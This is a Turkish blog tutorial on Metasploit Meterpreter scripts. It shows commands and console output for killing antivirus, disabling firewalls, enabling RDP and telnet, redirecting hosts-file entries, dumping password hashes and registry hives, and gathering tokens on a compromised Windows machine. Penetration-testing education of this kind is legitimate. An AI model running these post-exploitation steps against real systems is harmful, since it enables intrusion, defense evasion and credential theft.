---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-14T13:45:00Z"
excerpt: Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük
  ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda,
  Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından
  ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.
guid: https://www.siberoloji.com/?p=1203
id: 1203
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Scripting
url: /tr/msf-meterpreter-scripting/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="meterpreter-scripting">Meterpreter Scripting 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.</p>
  

<!-- wp:paragraph -->
<p>Metasploit Framework sisteminin tamamında olduğu gibi Meterpreter script kodları da Ruby programlama diliyle yazılmaktadır. Ruby hakkında yeterli bilgi sahibi değilseniz,&nbsp;<a href="http://ruby-doc.org/docs/ProgrammingRuby/">Ruby Programlama</a>&nbsp;web sitesini bir miktar incelemenizi tavsiye ediyorum.</p>
  

<!-- wp:paragraph -->
<p>Metasploit Framework içerisinde mevcut bulunan scriptleri incelemek isterseniz,&nbsp;<a href="https://www.offensive-security.com/metasploit-unleashed/existing-scripts/">Github</a>&nbsp;adresini inceleyebilirsiniz. Mevcut scriptlerin incelenmesi bizim çok işimize yarayacaktır. Muhtemelen, sizin yapmak istediğiniz işleme ait bir örnek kod parçası mevcut scriptlerin içinde bulunmaktadır. Buradan istediğiniz kod bölümünü alarak kullanmak en mantıklı yaklaşım olacaktır.</p>
  

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="mevcut-scriptler">Mevcut Scriptler 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Aşağıda, bir kaç script örneği ve ne gibi işlemler yaptığı açıklanmıştır. Bu doğrultuda Ruby kodlarını inceleyebilirsiniz.</p>
  

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpreter oturumu açmış olmanız gerekmektedir. Anlatımlarda, oturum açtığınız kabul edilmiştir.</p>
  </blockquote>
<!-- /wp:quote -->

 
<h2 class="wp-block-heading" id="checkvm">checkvm</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>checkvm</code>&nbsp;scripti, adından da anlaşılacağı gibi, oturumu bir sanal makinede açıp açmadığınızı kontrol etmekte kullanılır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run checkvm  
 
 <strong>[</strong><strong>*</strong><strong>]</strong> Checking <strong>if </strong>SSHACKTHISBOX-0 is a Virtual Machine ........
 <strong>[</strong><strong>*</strong><strong>]</strong> This is a VMware Workstation/Fusion Virtual Machine
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="getcountermeasure">getcountermeasure</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>getcountermeasure</code>&nbsp;scripti, hedef sistemin güvenlik bilgisini görmeyi sağlar. Antivirüs veya Firewall u devre dışı bırakmanıza yardım eder.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run getcountermeasure 
 
 <strong>[</strong><strong>*</strong><strong>]</strong> Running Getcountermeasure on the target... 
 <strong>[</strong><strong>*</strong><strong>]</strong> Checking <strong>for </strong>contermeasures...
 <strong>[</strong><strong>*</strong><strong>]</strong> Getting Windows Built <strong>in </strong>Firewall configuration...
 <strong>[</strong><strong>*</strong><strong>]</strong>    
 <strong>[</strong><strong>*</strong><strong>]</strong>     Domain profile configuration:
 <strong>[</strong><strong>*</strong><strong>]</strong>     -------------------------------------------------------------------
 <strong>[</strong><strong>*</strong><strong>]</strong>     Operational mode                  <strong>=</strong> Disable
 <strong>[</strong><strong>*</strong><strong>]</strong>     Exception mode                    <strong>=</strong> Enable
 <strong>[</strong><strong>*</strong><strong>]</strong>    
 <strong>[</strong><strong>*</strong><strong>]</strong>     Standard profile configuration:
 <strong>[</strong><strong>*</strong><strong>]</strong>     -------------------------------------------------------------------
 <strong>[</strong><strong>*</strong><strong>]</strong>     Operational mode                  <strong>=</strong> Disable
 <strong>[</strong><strong>*</strong><strong>]</strong>     Exception mode                    <strong>=</strong> Enable
 <strong>[</strong><strong>*</strong><strong>]</strong>    
 <strong>[</strong><strong>*</strong><strong>]</strong>     Local Area Connection 6 firewall configuration:
 <strong>[</strong><strong>*</strong><strong>]</strong>     -------------------------------------------------------------------
 <strong>[</strong><strong>*</strong><strong>]</strong>     Operational mode                  <strong>=</strong> Disable
 <strong>[</strong><strong>*</strong><strong>]</strong>    
 <strong>[</strong><strong>*</strong><strong>]</strong> Checking DEP Support Policy...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="getgui">getgui</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>getgui</code>&nbsp;scripti, hedef bilgisayarda RDP özelliği kapalıysa açmayı sağlar.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run getgui 

<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
<strong>[!]</strong> Example: run post/windows/manage/enable_rdp OPTION<strong>=</strong>value <strong>[</strong>...]
Windows Remote Desktop Enabler Meterpreter Script
Usage: getgui -u  -p 
Or:    getgui -e

OPTIONS:

    -e        Enable RDP only.
    -f   Forward RDP Connection.
    -h        Help menu.
    -p   The Password of the user to add.
    -u   The Username of the user to add.
 
 meterpreter <strong>&gt;</strong> run getgui -e
 
 <strong>[</strong><strong>*</strong><strong>]</strong> Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
 <strong>[</strong><strong>*</strong><strong>]</strong> Carlos Perez carlos_perez@darkoperator.com
 <strong>[</strong><strong>*</strong><strong>]</strong> Enabling Remote Desktop
 <strong>[</strong><strong>*</strong><strong>]</strong> RDP is already enabled
 <strong>[</strong><strong>*</strong><strong>]</strong> Setting Terminal Services service startup mode
 <strong>[</strong><strong>*</strong><strong>]</strong> Terminal Services service is already set to auto
 <strong>[</strong><strong>*</strong><strong>]</strong> Opening port <strong>in </strong>local firewall <strong>if </strong>necessary
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="get_local_subnets">get_local_subnets</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>get_local_subnets</code>&nbsp;scripti, hedef bilgisayarın yerel subnet bilgilerini elde etmeyi sağlar. Bu bilgiler pivoting işlemlerinde kullanılabilir.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run get_local_subnets 

Local subnet: 10.211.55.0/255.255.255.0
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="gettelnet">gettelnet</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>gettelnet</code>&nbsp;scripti, hedef bilgisayarda telnet özeliği kapalıysa, açmaya yarar.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run gettelnet 
Windows Telnet Server Enabler Meterpreter Script
Usage: gettelnet -u  -p 

OPTIONS:

    -e        Enable Telnet Server only.
    -f   Forward Telnet Connection.
    -h        Help menu.
    -p   The Password of the user to add.
    -u   The Username of the user to add.
 
meterpreter <strong>&gt;</strong> run gettelnet -e

<strong>[</strong><strong>*</strong><strong>]</strong> Windows Telnet Server Enabler Meterpreter Script
<strong>[</strong><strong>*</strong><strong>]</strong> Setting Telnet Server Services service startup mode
<strong>[</strong><strong>*</strong><strong>]</strong> The Telnet Server Services service is not set to auto, changing it to auto ...
<strong>[</strong><strong>*</strong><strong>]</strong> Opening port <strong>in </strong>local firewall <strong>if </strong>necessary
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="hostsedit">hostsedit</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>hostsedit</code>&nbsp;scripti, Windows hosts dosyasına bilgi girmeye yarar. Bağlanılmak istenen web adreslerinin DNS adresleri için önce bu hosts dosyasına bakılır. Hedef bilgisayarı istenen adrese yönlendirmek için kullanılır. Her satıra bir adres girilmelidir.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run hostsedit 

<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
<strong>[!]</strong> Example: run post/windows/manage/inject_host OPTION<strong>=</strong>value <strong>[</strong>...]
This Meterpreter script is <strong>for </strong>adding entries <strong>in </strong>to the Windows Hosts file.
Since Windows will check first the Hosts file instead of the configured DNS Server
it will assist <strong>in </strong>diverting traffic to the fake entry or entries. Either a single
entry can be provided or a series of entries provided a file with one per line.

OPTIONS:

    -e   Host entry <strong>in </strong>the format of IP,Hostname.
    -h        Help Options.
    -l   Text file with list of entries <strong>in </strong>the format of IP,Hostname. One per line.

Example:


run hostsedit -e 127.0.0.1,google.com

run hostsedit -l /tmp/fakednsentries.txt
 
 meterpreter <strong>&gt;</strong> run hostsedit -e 10.211.55.162,www.microsoft.com
 <strong>[</strong><strong>*</strong><strong>]</strong> Making Backup of the hosts file.
 <strong>[</strong><strong>*</strong><strong>]</strong> Backup loacated <strong>in </strong>C:\WINDOWS\System32\drivers\etc\hosts62497.back
 <strong>[</strong><strong>*</strong><strong>]</strong> Adding Record <strong>for </strong>Host <a href="http://www.microsoft.com/">www.microsoft.com</a> with IP 10.211.55.162
 <strong>[</strong><strong>*</strong><strong>]</strong> Clearing the DNS Cache
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="killav">killav</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>killav</code>&nbsp;scripti, sistemde bir servis olarak çalışan Antivirüs programlarını devre dışı bırakmada kullanılır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run killav 
 
 <strong>[</strong><strong>*</strong><strong>]</strong> Killing Antivirus services on the target...
 <strong>[</strong><strong>*</strong><strong>]</strong> Killing off cmd.exe...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="remotewinenum">remotewinenum</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>remotewinenum</code>&nbsp;scripti, hedef sistem hakkında bilgi etmek için kullanılır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run remotewinenum

<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
<strong>[!]</strong> Example: run post/windows/gather/wmic_command OPTION<strong>=</strong>value <strong>[</strong>...]
Remote Windows Enumeration Meterpreter Script
This script will enumerate windows hosts <strong>in </strong>the target enviroment
given a username and password or using the credential under witch
Meterpeter is running using WMI wmic windows native tool.
Usage:

OPTIONS:

    -h        Help menu.
    -p   Password of user on target system
    -t   The target address
    -u   User on the target system <strong>(</strong>If not provided it will use credential of process<strong>)</strong>
 
 meterpreter <strong>&gt;</strong> run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128
 
 <strong>[</strong><strong>*</strong><strong>]</strong> Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142 
 <strong>[</strong><strong>*</strong><strong>]</strong> Running WMIC Commands ....
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic environment list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic share list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic nicconfig list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic computersystem list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic useraccount list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic group list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic sysaccount list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic volume list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic logicaldisk get description,filesystem,name,size
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic netlogin get name,lastlogon,badpasswordcount
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic netclient list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic netuse get name,username,connectiontype,localname
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic share get name,path
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic nteventlog get path,filename,writeable
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic service list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic process list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic startup list full
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic rdtoggle list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic product get name,version
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wimic qfe list
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="scraper">scraper</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>scraper</code>&nbsp;scripti,&nbsp;<code>remotewinenum</code>&nbsp;ile elde edilen bilgiden daha fazlasını elde etmeye yarar. Elde edilen bilgilerin içinde registry kayıtları da bulunur.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run scraper
 
 <strong>[</strong><strong>*</strong><strong>]</strong> New session on 10.211.55.128:4444...
 <strong>[</strong><strong>*</strong><strong>]</strong> Gathering basic system information...
 <strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...
 <strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the entire registry...
 <strong>[</strong><strong>*</strong><strong>]</strong> Exporting HKCU
 <strong>[</strong><strong>*</strong><strong>]</strong> Downloading HKCU <strong>(</strong>C:\WINDOWS\TEMP\LQTEhIqo.reg<strong>)</strong>
 <strong>[</strong><strong>*</strong><strong>]</strong> Cleaning HKCU
 <strong>[</strong><strong>*</strong><strong>]</strong> Exporting HKLM
 <strong>[</strong><strong>*</strong><strong>]</strong> Downloading HKLM <strong>(</strong>C:\WINDOWS\TEMP\GHMUdVWt.reg<strong>)</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldukça detaylı bilgi toplanabilmektedir. Bunun yanında Antivirüs veya Firewall iptal etmede de kullanılmaktadır.</p>
  

 
<h2 class="wp-block-heading" id="winenum">winenum</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>winenum</code>&nbsp;scripti, sistem hakkında en detaylı bilgiyi elde etmede kullanılabilir. Token, hash bilgileri ve diğer tüm bilgileri&nbsp;<code>winenum</code>&nbsp;scripti ile görebilirsiniz.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run winenum 
 
 <strong>[</strong><strong>*</strong><strong>]</strong> Running Windows Local Enumerion Meterpreter Script
 <strong>[</strong><strong>*</strong><strong>]</strong> New session on 10.211.55.128:4444...
 <strong>[</strong><strong>*</strong><strong>]</strong> Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
 <strong>[</strong><strong>*</strong><strong>]</strong> Checking <strong>if </strong>SSHACKTHISBOX-0 is a Virtual Machine ........
 <strong>[</strong><strong>*</strong><strong>]</strong>     This is a VMware Workstation/Fusion Virtual Machine 
 <strong>[</strong><strong>*</strong><strong>]</strong> Running Command List ...
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command cmd.exe /c set
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command arp -a
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command ipconfig /all
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command ipconfig /displaydns
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command route print
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net view
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command netstat -nao
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command netstat -vb
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command netstat -ns
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net accounts
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net accounts /domain
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net session
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net share
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net group
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net user
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net localgroup
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net localgroup administrators
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net group administrators
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command net view /domain
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command netsh firewall show config
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command tasklist /svc
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command tasklist /m
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command gpresult /SCOPE COMPUTER /Z
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command gpresult /SCOPE USER /Z
 <strong>[</strong><strong>*</strong><strong>]</strong> Running WMIC Commands ....
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic computersystem list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic useraccount list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic group list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic service list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic volume list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic logicaldisk get description,filesystem,name,size
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic netlogin get name,lastlogon,badpasswordcount
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic netclient list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic netuse get name,username,connectiontype,localname
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic share get name,path
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic nteventlog get path,filename,writeable
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic process list brief
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic startup list full
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic rdtoggle list
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic product get name,version
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command wmic qfe
 <strong>[</strong><strong>*</strong><strong>]</strong> Extracting software list from registry
 <strong>[</strong><strong>*</strong><strong>]</strong> Finished Extraction of software list from registry
 <strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...
 <strong>[</strong><strong>*</strong><strong>]</strong> Hashes Dumped
 <strong>[</strong><strong>*</strong><strong>]</strong> Getting Tokens...
 <strong>[</strong><strong>*</strong><strong>]</strong> All tokens have been processed
 <strong>[</strong><strong>*</strong><strong>]</strong> Done!</code></pre>
<!-- /wp:code -->